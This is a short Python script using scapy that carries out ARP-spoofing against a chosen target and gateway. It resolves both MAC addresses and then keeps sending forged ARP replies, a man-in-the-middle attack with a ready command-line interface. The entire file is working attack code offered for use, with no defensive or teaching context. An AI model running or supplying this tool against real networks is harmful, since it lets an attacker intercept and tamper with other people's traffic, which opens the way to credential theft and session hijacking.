from scapy.all import *
import argparse
import threading
import time

def get_mac(ip, interface):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = srp(arp_request_broadcast, timeout=1, verbose=False, iface=interface)[0]

    if answered:
        return answered[0][1].hwsrc
    return None

def mitm_attack(target_ip, gateway_ip, interface, interval=2):
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)

    def send_arp_response(target, gateway, target_mac, gateway_mac):
        arp_response_target = ARP(op=2, psrc=gateway, pdst=target, hwdst=target_mac)
        arp_response_gateway = ARP(op=2, psrc=target, pdst=gateway, hwdst=gateway_mac)
        send(arp_response_target, iface=interface, verbose=False)
        send(arp_response_gateway, iface=interface, verbose=False)

    try:
        while True:
            send_arp_response(target_ip, gateway_ip, target_mac, gateway_mac)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("MITM Attack stopped.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Man-in-the-Middle Attack")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("gateway_ip", help="Gateway IP address")
    parser.add_argument("interface", help="Network interface to use")
    parser.add_argument("--interval", type=int, default=2, help="Interval between ARP responses in seconds")
    args = parser.parse_args()

    mitm_attack(args.target_ip, args.gateway_ip, args.interface, args.interval)